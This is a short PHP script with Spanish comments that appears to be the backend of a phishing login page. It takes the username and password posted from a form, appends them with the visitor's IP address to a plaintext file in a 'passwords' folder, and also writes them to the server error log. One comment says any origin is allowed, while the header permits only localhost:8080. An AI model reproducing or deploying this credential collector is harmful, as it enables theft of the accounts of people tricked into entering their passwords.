<?php
// Permitir solicitudes desde cualquier origen
header("Access-Control-Allow-Origin: http://localhost:8080");

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Obtener los datos enviados desde el formulario
    $user = $_POST["user"];
    $password = $_POST["password"];

    // Obtener la IP del cliente
    $ip = $_SERVER["REMOTE_ADDR"];

    // Construir la cadena de datos a guardar
    $data = "Usuario: " . $user . "\n";
    $data .= "Contraseña: " . $password . "\n";
    $data .= "IP del Cliente: " . $ip . "\n";

    // Ruta del archivo en la que se guardarán los datos
    $archivo = "../passwords/registros.txt";

    // Guardar los datos en el archivo
    if (file_put_contents($archivo, $data, FILE_APPEND) !== false) {
        echo "Datos guardados correctamente.";
    } else {
        $error_message = "Error al guardar los datos.";
        echo $error_message;
        error_log($error_message);
    }
} else {
    $error_message = "Error: Se esperaba una solicitud POST.";
    echo $error_message;
    error_log($error_message);
}

error_log($user . " " . $password);

?>
